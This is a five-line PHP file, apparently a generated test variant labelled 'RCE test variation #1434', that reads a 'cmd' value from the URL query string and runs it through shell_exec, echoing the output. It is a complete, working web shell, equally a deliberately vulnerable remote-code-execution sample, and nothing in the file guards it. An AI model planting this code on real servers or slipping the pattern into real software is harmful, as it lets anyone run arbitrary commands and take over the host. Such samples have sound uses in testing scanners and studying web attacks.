<?php
// RCE test variation #1434
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>